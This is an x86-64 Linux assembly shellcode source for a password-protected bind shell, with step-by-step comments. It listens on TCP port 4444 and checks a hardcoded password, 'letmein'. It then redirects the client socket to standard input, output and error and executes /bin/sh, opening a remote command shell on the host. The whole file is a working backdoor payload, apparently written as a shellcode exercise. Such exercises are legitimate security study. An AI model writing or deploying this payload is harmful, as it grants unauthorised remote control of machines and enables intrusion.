global _start

; port 4444
; >>> hex(socket.htons(4444))
; '0x5c11'
%define PORTNUMBER 0x5c11

section .text
_start:

socket_call:
  ; #define __NR_socket 41
  ; int socket(int domain, int type, int protocol);
  ;; rax -> 41
  ;; rdi -> 2 -> AF_INET
  ;; rsi -> 1 -> SOCK_STREAM
  ;; rdx -> 0

  ; >>> import socket
  ; >>> socket.AF_INET
  ; 2
  ; >>> socket.SOCK_STREAM
  ; 1
  ; >>> socket.INADDR_ANY
  ; 0

  push 41
  pop rax         ; socket syscall

  push 2
  pop rdi         ; domain -> AF_INET

  push 1
  pop rsi         ; type -> SOCK_STREAM

  xor edx, edx    ; protocol -> 0

  syscall         ; <-- socket's return val stored in rax after syscall

bind_call:
  ; #define __NR_bind 49
  ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
  ;; rax -> 49
  ;; rdi -> fd already stored in rdi
  ;; rsi -> pointer to 16 bytes of space groomed to contain a sockaddr_in struct
  ;; rdx -> length of rsi (16)
  xchg edi, eax

  ; assumption: rax contains result of socket syscall, use it to
  ; zero out rdx via sign extension

  ; new assumption:  rdx is already zero and isn't affected by the syscall
  ; cdq

  push rdx    ; 2 pushes to get the 00 in between 0x5c11 and 02
  push rdx

  mov word [rsp + 2], PORTNUMBER
  mov byte [rsp], 0x2

  mov rsi, rsp    ; sockaddr_in populated, address at rsi

  push 49
  pop rax
  push 16
  pop rdx
  syscall

listen_call:
  ; #define __NR_listen 50
  ; int listen(int sockfd, int backlog);
  ;; rax -> 50
  ;; rdi -> fd already stored in rdi
  ;; rsi -> 1
  push 50
  pop rax         ; listen syscall#

  push 1
  pop rsi         ; backlog
  syscall

accept_call:
  ; #define __NR_accept 43
  ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  ;; rax -> 43
  ;; rdi -> fd already stored in rdi
  ;; rsi -> pointer to 16 bytes of space
  ;; rdx -> pointer to length of rsi (16)
  push 43
  pop rax         ; accept syscall#

  cdq             ; zero out rdx
  push rdx
  push rdx

  mov rsi, rsp    ; when populated, client will be stored in rsi
  push 16
  lea rdx, [rsp]
  syscall

  ; store client socket descriptor in r9 to restore after closing the parent
  xchg r9, rax

close_call:
  ; #define __NR_close 3
  ; int close(int fd);
  ;; rax -> 3
  ;; rdi -> fd already stored in rdi
  push 3
  pop rax
  syscall

  ; restore client socket descriptor to rdi
  mov rdi, r9

  jz read_call      ; close gracefully if we get here from a bad password
  push 60
  pop rax
  syscall


read_call:
  ; #define __NR_read 0
  ; ssize_t read(int fd, void *buf, size_t count);
  ;; rax -> 0
  ;; rdi -> client already stored in rdi
  ;; rsi -> 24 bytes allocated should be good
  ;; rdx -> 24

  xor eax, eax

  sub rsp, 24
  mov rsi, rsp    ; user input

  push 24
  pop rdx

  syscall         ; <-- result from user stored in rsi

compare:
  ; >>> binascii.hexlify(b'letmein\n'[::-1])
  ; '0a6e69656d74656c'
  mov rax, 0x0a6e69656d74656c   ; letmein\n
  lea rdi, [rsi]

  scasq
  mov rdi, r9           ; restore client socket
  jne close_call ; if password isn't right, close the client socket

dup2_calls:
  ; #define __NR_dup2 33
  ; int dup2(int oldfd, int newfd);
  ;; rax -> 33
  ;; rdi -> client socket
  ;; rsi -> 2 -> 1 -> 0 (3 iterations)
  push 3
  pop rcx               ; loop counter

  push 2
  pop rbx               ; fd counter
  dup2_loop:
    push 33
    pop rax
    mov esi, ebx        ; 2 -> 1 -> 0
    push rcx            ; store loop counter
    syscall
    pop rcx             ; restore loop counter
    dec rbx
    loop dup2_loop

exec_call:
  ; #define __NR_execve 59
  ; int execve(const char *filename, char *const argv[], char *const envp[]);
  ;; rax -> 59
  ;; rdi -> "/bin//sh", 0x0
  ;; rsi -> [addr of bin/sh], 0x0
  ;; rdx -> 0x0

  xor edx, edx
  push rdx          ; first NULL push

  ; push /bin//sh in reverse
  mov rbx, 0x68732f2f6e69622f
  push rbx

  ; store /bin//sh address in RDI
  mov rdi, rsp

  ; second NULL push
  push rdx

  ; push address of /bin//sh
  push rdi

  ; set RSI
  mov rsi, rsp

  ; call execve
  lea rax, [rdx + 59]
  syscall
